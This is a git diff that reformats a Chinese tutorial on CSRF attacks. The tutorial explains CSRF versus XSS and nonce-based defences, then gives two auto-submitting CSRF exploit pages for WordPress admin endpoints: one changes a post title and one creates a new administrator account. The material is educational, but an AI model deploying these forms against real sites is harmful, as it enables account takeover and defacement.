@@ -1,6 +1,8 @@
+[![返回目录](https://parg.co/U0y)](https://parg.co/UHU)
+
 # CSRF 跨站请求详解
 
-CSRF (Cross-site request forgery)，中文名称：跨站请求伪造，也被称为：one click attack/session riding ，缩写为：CSRF/XSRF 。 CSRF 与 XSS 在攻击手段上有点类似，都是在客户端执行恶意代码，有些文章中认为    CSRF 与 XSS 的区别在于 CSRF 不注重于获取用户 Cookie，笔者认为可能还有区别在于 CSRF 不仅可以在源站发起攻击，还可以引导用户访问其他危险网站的同时发起攻击。XSS 全程是跨站脚本攻击，即攻击者向某个 Web 页面中插入恶意的 JavaScript 脚本，而当普通用户访问时，该恶意脚本自动执行而从盗取用户的 Cookie 等信息。对于 XSS 的防御手段主要就是输入检查与输出检查，譬如对用户输入的文本框内容进行 <、> 这样的特殊字符检查。而输出检查则是指对于输出到网页的内容进行过滤或者编解码，譬如使用 HTML 编码将 < 转义。CSRF 为跨站请求伪造，其与 XSS 有点类似，不过区别在于 CSRF 不一定依赖于 JavaScript，并且不仅可以在源站发起攻击，还有可能当用户访问恶意网站时引导其访问原网站。CSRF 攻击是源于 WEB 的隐式身份验证机制，WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。对于 CSRF 的防御也分为服务端防御与客户端防御两种，服务端防御典型的譬如给某个页面添加随机数，使得无法从第三方页面直接提交。在客户端防御的话可以利用譬如 Firefox 提供的一些检查工具。注意，CSRF 并没有打破同源策略。
+CSRF (Cross-site request forgery)，中文名称：跨站请求伪造，也被称为：one click attack/session riding ，缩写为：CSRF/XSRF 。 CSRF 与 XSS 在攻击手段上有点类似，都是在客户端执行恶意代码，有些文章中认为 CSRF 与 XSS 的区别在于 CSRF 不注重于获取用户 Cookie，笔者认为可能还有区别在于 CSRF 不仅可以在源站发起攻击，还可以引导用户访问其他危险网站的同时发起攻击。XSS 全程是跨站脚本攻击，即攻击者向某个 Web 页面中插入恶意的 JavaScript 脚本，而当普通用户访问时，该恶意脚本自动执行而从盗取用户的 Cookie 等信息。对于 XSS 的防御手段主要就是输入检查与输出检查，譬如对用户输入的文本框内容进行 <、> 这样的特殊字符检查。而输出检查则是指对于输出到网页的内容进行过滤或者编解码，譬如使用 HTML 编码将 < 转义。CSRF 为跨站请求伪造，其与 XSS 有点类似，不过区别在于 CSRF 不一定依赖于 JavaScript，并且不仅可以在源站发起攻击，还有可能当用户访问恶意网站时引导其访问原网站。CSRF 攻击是源于 WEB 的隐式身份验证机制，WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。对于 CSRF 的防御也分为服务端防御与客户端防御两种，服务端防御典型的譬如给某个页面添加随机数，使得无法从第三方页面直接提交。在客户端防御的话可以利用譬如 Firefox 提供的一些检查工具。注意，CSRF 并没有打破同源策略。
 
 ![](https://coding.net/u/hoteam/p/Cache/git/raw/master/2016/8/1/ED00B51D-6854-4B92-9416-AC108B3FF2A1.png)
 
@@ -42,62 +44,78 @@ CSRF 攻击是源于 WEB 的隐式身份验证机制，WEB 的身份验证机制
 那么这个漏洞实际上就是攻击者引导用户先进入目标的 WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，核心的 Exploit 代码为 :
 
 ```html
- <html>
+<html>
   <body onload="javascript:document.forms[0].submit()">
     <h2>CSRF Exploit to change post title</h2>
-    <form method="POST" name="form0" action="http://<wordpress_ip>:80/wp-admin/admin-ajax.php">
-      <input type="hidden" name="post_title" value="hackedtitle"/>
-      <input type="hidden" name="post_name" value="hackedtitle"/>
-      <input type="hidden" name="mm" value="03"/>
-      <input type="hidden" name="jj" value="16"/>
-      <input type="hidden" name="aa" value="2012"/>
-      <input type="hidden" name="hh" value=""/>
-      <input type="hidden" name="mn" value=""/>
-      <input type="hidden" name="ss" value=""/>
-      <input type="hidden" name="post_author" value="1"/>
-      <input type="hidden" name="post_password" value=""/>
-      <input type="hidden" name="post_category%5B%5D" value="0"/>
-      <input type="hidden" name="post_category%5B%5D" value="1"/>
-      <input type="hidden" name="tax_input%5Bpost_tag%5D" value=""/>
-      <input type="hidden" name="comment_status" value="open"/>
-      <input type="hidden" name="ping_status" value="open"/>
-      <input type="hidden" name="_status" value="publish"/>
-      <input type="hidden" name="post_format" value="0"/>
-      <input type="hidden" name="_inline_edit" value="<sniffed_value>"/>
-      <input type="hidden" name="post_view" value="list"/>
-      <input type="hidden" name="screen" value="edit-post"/>
-      <input type="hidden" name="action" value="inline-save"/>
-      <input type="hidden" name="post_type" value="post"/>
-      <input type="hidden" name="post_ID" value="1"/>
-      <input type="hidden" name="edit_date" value="true"/>
-      <input type="hidden" name="post_status" value="all"/>
+    <form
+      method="POST"
+      name="form0"
+      action="http://<wordpress_ip>:80/wp-admin/admin-ajax.php"
+    >
+      <input type="hidden" name="post_title" value="hackedtitle" />
+      <input type="hidden" name="post_name" value="hackedtitle" />
+      <input type="hidden" name="mm" value="03" />
+      <input type="hidden" name="jj" value="16" />
+      <input type="hidden" name="aa" value="2012" />
+      <input type="hidden" name="hh" value="" />
+      <input type="hidden" name="mn" value="" />
+      <input type="hidden" name="ss" value="" />
+      <input type="hidden" name="post_author" value="1" />
+      <input type="hidden" name="post_password" value="" />
+      <input type="hidden" name="post_category%5B%5D" value="0" />
+      <input type="hidden" name="post_category%5B%5D" value="1" />
+      <input type="hidden" name="tax_input%5Bpost_tag%5D" value="" />
+      <input type="hidden" name="comment_status" value="open" />
+      <input type="hidden" name="ping_status" value="open" />
+      <input type="hidden" name="_status" value="publish" />
+      <input type="hidden" name="post_format" value="0" />
+      <input type="hidden" name="_inline_edit" value="<sniffed_value>" />
+      <input type="hidden" name="post_view" value="list" />
+      <input type="hidden" name="screen" value="edit-post" />
+      <input type="hidden" name="action" value="inline-save" />
+      <input type="hidden" name="post_type" value="post" />
+      <input type="hidden" name="post_ID" value="1" />
+      <input type="hidden" name="edit_date" value="true" />
+      <input type="hidden" name="post_status" value="all" />
     </form>
   </body>
- </html>
+</html>
 ```
 
 另一个测试用例时添加某个具有管理员权限的用户，测试用例为 :
 
 ```html
- <html>
- <body onload="javascript:document.forms[0].submit()">
- <H2>CSRF Exploit to add Administrator</H2>
- <form method="POST" name="form0" action="http://<wordpress_ip>:80/wp-admin/user-new.php">
- <input type="hidden" name="action" value="createuser"/>
- <input type="hidden" name="_wpnonce_create-user" value="<sniffed_value>"/>
- <input type="hidden" name="_wp_http_referer" value="%2Fwordpress%2Fwp-admin%2Fuser-new.php"/>
- <input type="hidden" name="user_login" value="admin2"/>
- <input type="hidden" name="email" value="admin2@admin.com"/>
- <input type="hidden" name="first_name" value="admin2@admin.com"/>
- <input type="hidden" name="last_name" value=""/>
- <input type="hidden" name="url" value=""/>
- <input type="hidden" name="pass1" value="password"/>
- <input type="hidden" name="pass2" value="password"/>
- <input type="hidden" name="role" value="administrator"/>
- <input type="hidden" name="createuser" value="Add+New+User+"/>
- </form>
- </body>
- </html>
+<html>
+  <body onload="javascript:document.forms[0].submit()">
+    <h2>CSRF Exploit to add Administrator</h2>
+    <form
+      method="POST"
+      name="form0"
+      action="http://<wordpress_ip>:80/wp-admin/user-new.php"
+    >
+      <input type="hidden" name="action" value="createuser" />
+      <input
+        type="hidden"
+        name="_wpnonce_create-user"
+        value="<sniffed_value>"
+      />
+      <input
+        type="hidden"
+        name="_wp_http_referer"
+        value="%2Fwordpress%2Fwp-admin%2Fuser-new.php"
+      />
+      <input type="hidden" name="user_login" value="admin2" />
+      <input type="hidden" name="email" value="admin2@admin.com" />
+      <input type="hidden" name="first_name" value="admin2@admin.com" />
+      <input type="hidden" name="last_name" value="" />
+      <input type="hidden" name="url" value="" />
+      <input type="hidden" name="pass1" value="password" />
+      <input type="hidden" name="pass2" value="password" />
+      <input type="hidden" name="role" value="administrator" />
+      <input type="hidden" name="createuser" value="Add+New+User+" />
+    </form>
+  </body>
+</html>
 ```
 
 ## Oracle GlassFish Server - REST Cross-Site Request Forgery
